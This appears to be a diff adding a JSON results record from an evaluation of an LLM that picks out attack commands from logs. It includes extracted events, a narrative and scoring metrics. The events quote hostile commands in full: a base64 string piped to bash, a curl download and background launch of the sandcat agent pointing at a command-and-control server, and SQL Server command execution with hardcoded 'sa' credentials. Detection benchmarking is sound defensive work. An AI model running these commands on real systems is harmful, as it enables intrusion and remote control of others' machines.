@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The system appears to have been accessed through an initial access exploit using a base64 encoded string. The attacker then downloaded and executed malware called 'sandcat', which communicated back to its command and control server to receive further instructions. The attacker also ran discovery commands to gather more information about their surroundings, such as running whoami, as well as attempting to collect sensitive information via SQL Server exploitation.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 24804,
+      "completion_tokens": 1807,
+      "total_tokens": 26611,
+      "wall_clock_s": 41.401,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6,
+      "recall": 0.375,
+      "f1": 0.4615384615384615,
+      "tp": 3,
+      "fp": 2,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.2,
+      "recall": 0.14285714285714285,
+      "f1": 0.16666666666666666,
+      "tp": 1,
+      "fp": 4,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 24804,
+      "completion_tokens": 1807,
+      "total_tokens": 26611,
+      "wall_clock_s": 41.401,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
